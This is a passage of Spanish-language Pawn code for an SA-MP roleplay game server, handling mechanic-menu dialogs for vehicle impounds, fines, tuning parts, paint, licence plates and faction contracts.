		case MECANICO_MENU_EMBARGAR:
		{
			if(response)
		    {
				switch(listitem)
				{
			    	case 0:
			    	{
				        if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_ROJO, "No estás en un vehículo!");
					    if(!EsComprable(idcar))return Mensaje(playerid, COLOR_ROJO, "Este vehículo no tiene dueño!");
				        Mensaje(playerid, COLOR_AMARILLO2, "Has agregado un embargo a este vehículo! +1");
				        autos[idcar][cEmbargo] += 1;
			    	    return 1;
					}
					case 1:
					{
					    if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
					    if(!EsComprable(idcar))return Mensaje(playerid, COLOR_ROJO, "Este vehículo no tiene dueño!");
				    	Mensaje(playerid, COLOR_AMARILLO2, "Has quitado un embargo a este vehículo! -1");
      					autos[idcar][cEmbargo] -= 1;
			        	return 1;
					}
					case 2:
					{
					    if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
					    if(!EsComprable(idcar))return Mensaje(playerid, COLOR_ROJO, "Este vehículo no tiene dueño!");
					    ShowPlayerDialog(playerid, MECANICO_MENU_MULTAR, DIALOG_STYLE_INPUT, "-> Multar vehículo <-", "Estás a punto de multar un vehículo. Elige el precio que creas conveniente para sancionar el vehículo.\nRecuerda que el valor no debe sobrepasar los 3000$ de multa. Escribe el valor a multar:", "Multar", "Cancelar");
				    	return 1;
					}
					case 3:
					{
					    ShowPlayerDialog(playerid, MECANICO_MENU_DESEMBARGAR, DIALOG_STYLE_INPUT, "-> Desembargar vehículo <-", "Inserta el ID del vehículo para desembargar.", "Desembargar", "Cancelar");
					    return 1;
					}
				}
			}
		}
		case MECANICO_MENU_MULTAR:
		{
			if(response)
		    {
	    	    if(strval(inputtext) < 1 || strval(inputtext) > 3000)return Mensaje(playerid, COLOR_GRIS2, " Valor entre 1 - 3000$ !");
	        	if(autos[idcar][cEmbargo] > 2)return Mensaje(playerid, COLOR_GRIS2, " Este vehículo ya alcanzó el máximo de embargos y no puedes multarlo !");
		        if(autos[idcar][cMulta] > 8999)return Mensaje(playerid, COLOR_GRIS2, " No puedes multar este vehículo. Muchas multas acumuladas !");
		        autos[idcar][cMulta] += strval(inputtext);
				format(string, sizeof(string), "Multaste al vehículo con %d$!", strval(inputtext));
				Mensaje(playerid, COLOR_BLANCO, string);
				return 1;
			}
		}
		case MECANICO_MENU_DESEMBARGAR:
		{
			if(response)
		    {
	    	    if(!EsComprable(strval(inputtext)))return Mensaje(playerid, COLOR_GRIS2, "No es un vehículo con embargos!");
	        	autos[strval(inputtext)][cMulta] = 0;
		        autos[strval(inputtext)][cEmbargo] = 0;
				format(string, sizeof(string), "  Desemargaste al vehículo: %s cuyo dueño es %s !", autos[strval(inputtext)][cName], autos[strval(inputtext)][cOwner]);
				Mensaje(playerid, COLOR_BLANCO, string);
				return 1;
			}
		}
		case MECANICO_MENU_TUNING:
		{
			if(response)
		    {
	    	    if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
	        	if(!EsComprable(idcar))return Mensaje(playerid, COLOR_GRIS2, "Este vehículo no tiene dueño!");
	        	switch(listitem)
	        	{
					case 0:	{ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_global, DIALOG_STYLE_LIST, "-> Piezas Globales <-", "Nitro\nLlantas\nSuspensión\nGPS", "Aceptar", "Atrás");}
					case 1:
					{
					    if(SonBarcos(idcar))return Mensaje(playerid, COLOR_GRIS2, "No puedes ponerle esto a este tipo de vehiculo!");
						ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_SPECIAL, DIALOG_STYLE_LIST, "-> Tuning avanzado <-", "Piezas Wheel Arch Angels\nVinilo Alien\nVinilo Acces\nVinilo X-Flow", "Aceptar", "Atrás");
					}
					case 2: {ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_color, DIALOG_STYLE_LIST, "-> Cambiar Color <-", "Cambiar Color #1\nCambiar Color #2", "Aceptar", "Atrás");}
					case 3: {ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_name, DIALOG_STYLE_INPUT, "-> Cambiar Nombre Modelo <-", "Introduce el nuevo nombre del vehículo, ejemplo: Mercedes\n\nMáximo 12 carácteres.", "Cambiar", "Salir");}
					case 4: {ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_motor, DIALOG_STYLE_LIST, "-> Cambiar Motor <-", "6 Cilindros [1000 Litros]\n8 Cilindros [1500 Litros]\n10 Cilindros [2000 Litros]\n12 Cilindros [2500 litros]", "Instalar", "Salir");}
					case 5: {ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_bateria, DIALOG_STYLE_LIST, "-> Baterías <-", "Batería Cyclon 6V\t(Calidad: Baja)\nBatería Duncan 8V\t(Calidad: Media)\nBatería Bosch 12V\t(Calidad: Óptima)", "Instalar", "Salir");}
				}
			}
		}
		case MECANICO_MENU_TUNING_SPECIAL:
		{
			if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
	            	{
		                ShowPlayerDialog(playerid, TUNING_WAA, DIALOG_STYLE_LIST, "-> WAA <-", "Carrocería X-FLOW\nCarrocería Alien", "Aceptar", "Atrás");
		            }
	    	        case 1:
	        	    {
	            	    if(!EsComprable(idcar))return Mensaje(playerid, COLOR_GRIS2, "Vehículo sin dueño");
	                	if(IsLocolowVehicle(idcar) || IsWAAVehicle(idcar))
	                	{
		                    autos[idcar][cPaintjob] = 1;
		                    ChangeVehiclePaintjob(idcar, autos[idcar][cPaintjob]-1);
	    	                Mensaje(playerid, COLOR_GRIS2, "Vinilo instalado!");
	        	        } else Mensaje(playerid, COLOR_GRIS2, "Este vehículo no permite vinilos!");
	            	}
		            case 2:
		            {
	    	            if(!EsComprable(idcar))return Mensaje(playerid, COLOR_GRIS2, "Vehículo sin dueño");
	        	        if(IsLocolowVehicle(idcar) || IsWAAVehicle(idcar))
	            	    {
	                	    autos[idcar][cPaintjob] = 2;
	                    	ChangeVehiclePaintjob(idcar, autos[idcar][cPaintjob]-1);
	                    	Mensaje(playerid, COLOR_GRIS2, "Vinilo instalado!");
	                	} else Mensaje(playerid, COLOR_GRIS2, "Este vehículo no permite vinilos!");
	            	}
		            case 3:
		            {
	    	            if(!EsComprable(idcar))return Mensaje(playerid, COLOR_GRIS2, "Vehículo sin dueño");
	        	        if(IsLocolowVehicle(idcar) || IsWAAVehicle(idcar))
	            	    {
	                    	autos[idcar][cPaintjob] = 3;
	                	    ChangeVehiclePaintjob(idcar, autos[idcar][cPaintjob]-1);
	                    	Mensaje(playerid, COLOR_GRIS2, "Vinilo instalado!");
	                	} else Mensaje(playerid, COLOR_GRIS2, "Este vehículo no permite vinilos!");
	            	}
		        }
			}
		}
		case TUNING_WAA:
		{
			if(response)
		    {
	    	    switch(listitem)
	        	{
	            	// XFLOW TUNING
		            case 0:
		            {
	    	            Mensaje(playerid, COLOR_GRIS2, "CASE0");
						switch(GetVehicleModel(idcar))
			    	    {
			        	    case 560:
			            	{
		                        autos[idcar][cSideskirt] = 	1030;
		                        autos[idcar][cRoof] = 		1033;
	    	                    autos[idcar][cSpoiler] = 		1139;
	        	                autos[idcar][cRearBumper] = 	1140;
	            	            autos[idcar][cFrontBumper] = 	1170;
	                	        autos[idcar][cExhaust] = 	1029;
	                    	    AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            case 562:
				            {
	    	                    autos[idcar][cSideskirt] = 	1039;
	        	                autos[idcar][cRoof] = 		1035;
	            	            autos[idcar][cRearBumper] = 	1148;
	                	        autos[idcar][cFrontBumper] = 	1172;
	                    	    autos[idcar][cExhaust] = 	1037;
	                        	autos[idcar][cSpoiler] = 	1146;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            case 565:
				            {
	    	                    autos[idcar][cSideskirt] = 	1048;
	        	                autos[idcar][cRoof] = 		1053;
	            	            autos[idcar][cSpoiler] = 		1050;
	                	        autos[idcar][cRearBumper] = 	1151;
	                    	    autos[idcar][cFrontBumper] = 	1152;
	                        	autos[idcar][cExhaust] = 	1045;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            case 559:
				            {
	    	                    autos[idcar][cSideskirt] = 	1070;
	        	                autos[idcar][cRoof] = 		1068;
	            	            autos[idcar][cSpoiler] = 		1158;
	                	        autos[idcar][cRearBumper] = 	1161;
	                    	    autos[idcar][cFrontBumper] = 	1173;
	                        	autos[idcar][cExhaust] = 	1066;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            case 561:
				            {
	    	                    autos[idcar][cSideskirt] = 	1057;
	        	                autos[idcar][cRoof] = 		1061;
	            	            autos[idcar][cSpoiler] = 		1060;
	                	        autos[idcar][cRearBumper] = 	1156;
	                    	    autos[idcar][cFrontBumper] = 	1157;
	                        	autos[idcar][cExhaust] = 	1059;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            case 558:
				            {
	    	                    autos[idcar][cSideskirt] = 	1093;
	        	                autos[idcar][cRoof] = 		1091;
	            	            autos[idcar][cSpoiler] = 		1163;
	                	        autos[idcar][cRearBumper] = 	1167;
	                    	    autos[idcar][cFrontBumper] = 	1165;
	                        	autos[idcar][cExhaust] = 	1089;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería XFLOW Instalada!");
			            	}
				            default: Mensaje(playerid, COLOR_GRIS2, "Este vehículo no permite este tipo de tuning.");
				        }
	    	        }
	        	    // ALIEN TUNING
					case 1:
	            	{
		                Mensaje(playerid, COLOR_GRIS2, "CASE0");
						switch(GetVehicleModel(idcar))
				        {
				            case 560:
			    	        {
	                	        autos[idcar][cSideskirt] = 	1026;
	                    	    autos[idcar][cRoof] = 		1032;
	                        	autos[idcar][cSpoiler] = 		1138;
	                        	autos[idcar][cRearBumper] = 	1141;
	                        	autos[idcar][cFrontBumper] = 	1169;
	                        	autos[idcar][cExhaust] = 	1028;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
            	   				Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
			            	}
				            case 562:
				            {
	    	                    autos[idcar][cSideskirt] = 	1036;
	        	                autos[idcar][cRoof] = 		1038;
	            	            autos[idcar][cRearBumper] = 	1149;
	                	        autos[idcar][cFrontBumper] = 	1171;
	                    	    autos[idcar][cExhaust] = 	1034;
	                        	autos[idcar][cSpoiler] = 	1147;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
			            	}
				            case 565:
				            {
	    	                    autos[idcar][cSideskirt] = 	1047;
	        	                autos[idcar][cRoof] = 		1054;
	            	            autos[idcar][cSpoiler] = 		1049;
	                	        autos[idcar][cRearBumper] = 	1150;
	                    	    autos[idcar][cFrontBumper] = 	1153;
                        		autos[idcar][cExhaust] = 	1046;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
			            	}
				            case 559:
				            {
	    	                    autos[idcar][cSideskirt] = 	1069;
	        	                autos[idcar][cRoof] = 		1067;
	            	            autos[idcar][cSpoiler] = 		1162;
	                	        autos[idcar][cRearBumper] = 	1159;
	                    	    autos[idcar][cFrontBumper] = 	1160;
	                        	autos[idcar][cExhaust] = 	1065;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
				            }
				            case 561:
				            {
	        	                autos[idcar][cSideskirt] = 	1056;
	            	            autos[idcar][cRoof] = 		1055;
	                	        autos[idcar][cSpoiler] = 		1058;
	                    	    autos[idcar][cRearBumper] = 	1154;
	                        	autos[idcar][cFrontBumper] = 	1153;
	                        	autos[idcar][cExhaust] = 	1064;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
			            	}
				            case 558:
				            {
	    	                    autos[idcar][cSideskirt] = 	1094;
	        	                autos[idcar][cRoof] = 		1088;
	            	            autos[idcar][cSpoiler] = 		1164;
	                	        autos[idcar][cRearBumper] = 	1168;
	                    	    autos[idcar][cFrontBumper] = 	1166;
	                        	autos[idcar][cExhaust] = 	1092;
	                        	AddVehicleComponent(idcar, autos[idcar][cSideskirt]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRoof]);
	                        	AddVehicleComponent(idcar, autos[idcar][cRearBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cFrontBumper]);
	                        	AddVehicleComponent(idcar, autos[idcar][cExhaust]);
	                        	AddVehicleComponent(idcar, autos[idcar][cSpoiler]);
	                        	Mensaje(playerid, COLOR_BLANCO, "Carrocería ALIEN Instalada!");
			            	}
				            default: Mensaje(playerid, COLOR_GRIS2, "Este vehículo no permite este tipo de tuning.");
				        }
	    	        }
	        	}
			}
		}
		case MECANICO_MENU_TUNING_global:
		{
			if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
					{
					    if(SonBarcos(idcar))return Mensaje(playerid, COLOR_GRIS2, "No puedes ponerle esto a este tipo de vehiculo!");
						ShowPlayerDialog(playerid, TUNING_MENU_NITRO, DIALOG_STYLE_LIST, "-> Nitroso <-", "x2\nx5\nx10", "Tunear", "<<");
					}
	        	    case 1:
					{
					    if(SonBarcos(idcar))return Mensaje(playerid, COLOR_GRIS2, "No puedes ponerle esto a este tipo de vehiculo!");
						ShowPlayerDialog(playerid, TUNING_MENU_RUEDAS, DIALOG_STYLE_LIST, "-> Menú Llantas <-", "OffRoad\nShadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAcces", "Tunear", "<<");
					}
	        	    case 2:
					{
					    if(SonBarcos(idcar))return Mensaje(playerid, COLOR_GRIS2, "No puedes ponerle esto a este tipo de vehiculo!");
						ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_global_suspensionystereo, DIALOG_STYLE_LIST, "-> Supensión & Stereo <-", "Suspensión Hidráulica\nQuitar Suspension", "Tunear", "<<");
					}
	        	    case 3: { autos[idcar][cGPS] = 1; Mensaje(playerid, COLOR_BLANCO, "* Has instalado un GPS en el vehículo.");   }
				}
			}
		}
		case MECANICO_MENU_TUNING_color:
		{
			if(response)
		    {
	    	    switch(listitem)
				{
					case 0: { ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_color_1, DIALOG_STYLE_INPUT, "-> Cambiar Color #1 <-", "Inserta el ID del Color a cInteriorar (0-255)", "cInteriorar", "Atrás"); }
					case 1: { ShowPlayerDialog(playerid, MECANICO_MENU_TUNING_color_2, DIALOG_STYLE_INPUT, "-> Cambiar Color #2 <-", "Inserta el ID del Color a cInteriorar (0-255)", "cInteriorar", "Atrás"); }
				}
			}
		}
		case MECANICO_MENU_TUNING_name:
		{
		    if(response)
		    {
        	    strmid(autos[idcar][cName], inputtext, 0, strlen(inputtext), 12);
            	format(string, sizeof(string), "- Nuevo modelo: %s", autos[idcar][cPlate]);
         		GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	    	}
		}
		case MECANICO_MENU_TUNING_motor:
		{
			if(response)
		    {
        		GetVehiclePos(idcar, cx, cy, cz);
        		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
				{
					case 0: { autos[idcar][cGas] = 1000; Mensaje(playerid, COLOR_GRIS2, "Instalado motor de 6 Cilindros con 1000 Litros."); }
					case 1: { autos[idcar][cGas] = 1500; Mensaje(playerid, COLOR_GRIS2, "Instalado motor de 8 Cilindros con 1500 Litros."); }
					case 2: { autos[idcar][cGas] = 2000; Mensaje(playerid, COLOR_GRIS2, "Instalado motor de 10 Cilindros con 2000 Litros."); }
					case 3:	{ autos[idcar][cGas] = 2500; Mensaje(playerid, COLOR_GRIS2, "Instalado motor de 12 Cilindros con 2500 Litros.");  }
				}
			}
		}
		case MECANICO_MENU_TUNING_bateria:
		{
			if(response)
		    {
        		GetVehiclePos(idcar, cx, cy, cz);
        		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
				{
					case 0: { autos[idcar][cBattery] = 6000; Mensaje(playerid, COLOR_GRIS2, "Batería Cyclon 6V instalado!"); }
					case 1: { autos[idcar][cBattery] = 8000; Mensaje(playerid, COLOR_GRIS2, "Batería Duncan 8V instalado!"); }
					case 2: { autos[idcar][cBattery] = 12000; Mensaje(playerid, COLOR_GRIS2, "Batería Bosch 12V instalado!"); }
				}
			}
		}
		case MECANICO_MENU_TUNING_global_suspensionystereo:
		{
			if(response)
		    {
        	 	GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
	        	{
		            case 0: { Mensaje(playerid, COLOR_BLANCO, ">- Suspensión Hidráulica -<"); autos[idcar][cHydraulics] = 1087; AddVehicleComponent(idcar, autos[idcar][cHydraulics]);  return 1; }
		            case 1: { Mensaje(playerid, COLOR_BLANCO, ">- Suspensión Quitada -<"); autos[idcar][cHydraulics] = 0; return 1; }
				}
			}
		}
		case MECANICO_MENU_TUNING_color_1:
		{
			if(response)
		    {
	    	    if(strval(inputtext) < 0 || strval(inputtext) > 255)return Mensaje(playerid, COLOR_GRIS2, "ID Incorrecto de Color (0-255)");
         		GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1134, cx, cy, cz);
            	autos[idcar][cColorOne] = strval(inputtext);
            	ChangeVehicleColor(idcar, autos[idcar][cColorOne], autos[idcar][cColorTwo]);
			}
		}
		case MECANICO_MENU_TUNING_color_2:
		{
			if(response)
		    {
	    	    if(strval(inputtext) < 0 || strval(inputtext) > 255)return Mensaje(playerid, COLOR_GRIS2, "ID Incorrecto de Color (0-255)");
         		GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1134, cx, cy, cz);
            	autos[idcar][cColorTwo] = strval(inputtext);
            	ChangeVehicleColor(idcar, autos[idcar][cColorOne], autos[idcar][cColorTwo]);
			}
		}
		case TUNING_MENU_RUEDAS:
		{
			if(response)
		    {
        	 	GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
	        	{
		            case 0: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas OffRoad puestas! -<"); autos[idcar][cWheel] = 1025; AddVehicleComponent(idcar, autos[idcar][cWheel]); return 1; }
		            case 1: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Shadow puestas! -<"); autos[idcar][cWheel] = 1073; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	    	        case 2: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Mega puestas! -<"); autos[idcar][cWheel] = 1074; AddVehicleComponent(idcar, autos[idcar][cWheel]); return 1; }
	        	    case 3: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Rimshine puestas! -<"); autos[idcar][cWheel] = 1075; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 4: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Wires puestas! -<"); autos[idcar][cWheel] = 1076; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 5: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Classic puestas! -<"); autos[idcar][cWheel] = 1077; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 6: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Twist puestas! -<"); autos[idcar][cWheel] = 1078; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 7: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Cutter puestas! -<"); autos[idcar][cWheel] = 1079; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 8: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Switch puestas! -<"); autos[idcar][cWheel] = 1080; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 9: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Grove puestas! -<"); autos[idcar][cWheel] = 1081; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 10: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Import puestas! -<"); autos[idcar][cWheel] = 1082; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 11: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Dollar puestas! -<"); autos[idcar][cWheel] = 1083; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 12: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Trance puestas! -<"); autos[idcar][cWheel] = 1084; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 13: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Atomic puestas! -<"); autos[idcar][cWheel] = 1085; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 14: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Atomic puestas! -<"); autos[idcar][cWheel] = 1096; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 15: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Atomic puestas! -<"); autos[idcar][cWheel] = 1097; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
	            	case 16: { Mensaje(playerid, COLOR_BLANCO, ">- Llantas Atomic puestas! -<"); autos[idcar][cWheel] = 1098; AddVehicleComponent(idcar, autos[idcar][cWheel]);  return 1; }
				}
			}
		}
		case TUNING_MENU_NITRO:{
			if(response)
		    {
        	 	GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
	        	{
		            case 0: { Mensaje(playerid, COLOR_BLANCO, "Nitro x2 Instalado."); autos[idcar][cNitro] = 1009; AddVehicleComponent(idcar, autos[idcar][cNitro]); return 1; }
		            case 1: { Mensaje(playerid, COLOR_BLANCO, "Nitro x5 Instalado."); autos[idcar][cNitro] = 1008; AddVehicleComponent(idcar, autos[idcar][cNitro]); return 1; }
	    	        case 2: { Mensaje(playerid, COLOR_BLANCO, "Nitro x10 Instalado."); autos[idcar][cNitro] = 1010; AddVehicleComponent(idcar, autos[idcar][cNitro]); return 1; }
	        	}
			}
		}
		case MECANICO_MENU_OTROS:
		{
			if(response)
		    {
        	 	GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
	        	{
		            case 0:
					{
					    ShowPlayerDialog(playerid, MECANICO_MENU_OTROS_matricula, DIALOG_STYLE_INPUT, "-> Matricula <-", "Inserta una matrícula, de 5 carácteres numéricos", "Matricular", "Atrás");
					}
					case 1:
					{
						KillTimer(mmtimer);
					    mmtimer = SetTimer("MM_Noise", 1000, true);
					    SetTimerEx("vehiculoExamen", 6000, false, "i", playerid);
					    Mensaje(playerid, COLOR_BLANCO, "* Examinando vehículo, espere...");
					}
					case 2:
					{
						autos[idcar][cAlarm] = 1;
					    Mensaje(playerid, COLOR_BLANCO, "Alarma instalada!");
					}
				}
			}
		}
		case MECANICO_MENU_OTROS_matricula:
		{
			if(response)
		    {
	    	    if(strval(inputtext) > 99999 || strval(inputtext) < 11111)return ShowPlayerDialog(playerid, MECANICO_MENU_OTROS_matricula, DIALOG_STYLE_INPUT, "-> Matricula <-", "Inserta una matrícula, de 5 carácteres numéricos", "Matricular", "Atrás");
	        	format(string, sizeof(string), "SA - %d", strval(inputtext));
	        	strmid(autos[idcar][cPlate], string, 0, strlen(string), 11);
	        	SetVehicleNumberPlate(idcar, autos[idcar][cPlate]);
	        	Mensaje(playerid, COLOR_BLANCO, "Martrícula cambiada! Cuando respawnee el vehículo se verá la nueva matrícula!");
			}
		}
		case REQF_ACCEPT:
		{
		    if(response)
		    {
	    	    format(string, sizeof(string), "Felicidades! Ahora trabajas en %s, aceptaste el contrato!", ReqF_Name[playerid]);
	        	Mensaje(playerid, COLOR_AMARILLO2, string);
	        	cuenta[playerid][cMiembro]= ReqF_Faction[playerid];
	        	cuenta[playerid][cRango] = 1;
	        	UpdatePlayerStat(playerid);
	        	format(string, sizeof(string), "* %s acepta un contrato.", PlayerName(playerid));
      			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	        	ReqF_Name[playerid] = "No-Faction"; ReqF_Faction[playerid] = 0; booleano[Facturing]{playerid} = false;
	    	}
		    else
			{
        	    Mensaje(playerid, COLOR_GRIS2, "Rechazaste el contrato.");
            	format(string, sizeof(string), "* %s rechaza un contrato.", PlayerName(playerid));
      			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ReqF_Name[playerid] = "No-Faction"; ReqF_Faction[playerid] = 0; booleano[Facturing]{playerid} = false;
			}
		}
		case ENTER_LSTV:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
	            	{
	                    LoadObjects(playerid);
		                SetPosEx(playerid, -2719.7854, 519.2936, 48.3752, 0, 0, 0);
	    	            GameTextForPlayer(playerid, "~g~~h~lstv", 5000, 1);
	        	    }
	            	case 1:
	            	{
